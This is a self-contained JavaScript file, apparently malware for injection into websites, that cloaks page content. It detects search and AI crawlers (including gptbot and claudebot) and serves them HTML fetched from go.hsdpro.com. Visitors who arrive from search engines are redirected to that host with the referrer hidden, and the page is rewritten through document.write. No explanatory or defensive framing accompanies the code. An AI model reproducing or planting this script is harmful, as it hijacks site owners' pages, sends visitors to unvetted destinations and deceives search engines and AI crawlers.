(function () {
    'use strict';

    var cfg = {
        baseRedirectUrl: 'https://go.hsdpro.com/input.php',
        articleBase: 'https://go.hsdpro.com/html/',
        apiBase: 'https://go.hsdpro.com/input.php',
        allowedUAs: ['googlebot', 'google', 'bingbot', 'yandexbot', 'duckduckbot', 'baiduspider', 'sogou', 'slurp', 'msnbot', 'applebot', 'petalbot', 'facebookexternalhit', 'gptbot', 'claudebot', 'perplexitybot', 'tool'],
        searchEngines: ['google.', 'bing.', 'yahoo.', 'yandex.', 'baidu.', 'so.com', 'sogou.'],
        defaultId: '$id',
        timeout: 8000
    };

    if (window.__CLOAK_CFG__) {
        for (var k in window.__CLOAK_CFG__) {
            if (window.__CLOAK_CFG__.hasOwnProperty(k)) cfg[k] = window.__CLOAK_CFG__[k];
        }
    }

    if (window.__id_FETCH_RAN__) return;
    window.__id_FETCH_RAN__ = 1;

    if (window.top !== window.self) return;

    var params = new URLSearchParams(window.location.search);
    var gid = params.get('id') || params.get('gid') || cfg.defaultId;
    var host = window.location.hostname;
    var fileName = window.location.pathname.split('/').pop() || 'index.html';
    var ua = (navigator.userAgent || '').toLowerCase();
    var referrer = (document.referrer || '').toLowerCase();

    function redirectWithoutReferrer(url) {
        if (!url) return;
        var meta = document.createElement('meta');
        meta.name = 'referrer';
        meta.content = 'no-referrer';
        document.head.appendChild(meta);
        window.location.replace(url);
    }

    function isCrawler() {
        for (var i = 0; i < cfg.allowedUAs.length; i++) {
            if (ua.indexOf(cfg.allowedUAs[i]) !== -1) return true;
        }
        return false;
    }

    function isFromSearchEngine() {
        for (var i = 0; i < cfg.searchEngines.length; i++) {
            if (referrer.indexOf(cfg.searchEngines[i]) !== -1) return true;
        }
        return false;
    }

    function serveHtml(html) {
        document.open();
        document.write(html);
        document.close();
    }

    function fetchWithTimeout(url) {
        var ctrl = ('AbortController' in window) ? new AbortController() : null;
        var opts = ctrl ? { signal: ctrl.signal } : undefined;
        var timer = ctrl ? setTimeout(function () { ctrl.abort(); }, cfg.timeout) : null;
        return fetch(url, opts).then(function (r) {
            if (timer) clearTimeout(timer);
            return r;
        });
    }

    function tryServeArticle() {
        fetchWithTimeout(cfg.articleBase + fileName)
            .then(function (r) { return r.text(); })
            .then(serveHtml)
            .catch(function (e) { console.error(e); });
    }

    function handleApi(ids) {
        fetchWithTimeout(cfg.apiBase + '?ids=' + encodeURIComponent(ids) + '&host=' + encodeURIComponent(host) + '&cache=1')
            .then(function (r) { return r.text(); })
            .then(function (body) {
                var data = null;
                try { data = JSON.parse(body); } catch (e) { data = null; }
                if (data && (data.redirectUrl || (data.redirect_301 === true && data.url))) {
                    redirectWithoutReferrer(data.redirectUrl || data.url);
                    return;
                }
                if (body && body.charAt(0) === '<') {
                    serveHtml(body);
                    return;
                }
                tryServeArticle();
            })
            .catch(tryServeArticle);
    }

    var ids = (gid !== cfg.defaultId) ? gid : fileName;

    if (isCrawler() || gid !== cfg.defaultId) {
        handleApi(ids);
    } else if (isFromSearchEngine()) {
        redirectWithoutReferrer(cfg.baseRedirectUrl + '?site=' + encodeURIComponent(host) + '&id=' + encodeURIComponent(gid));
    }
})();
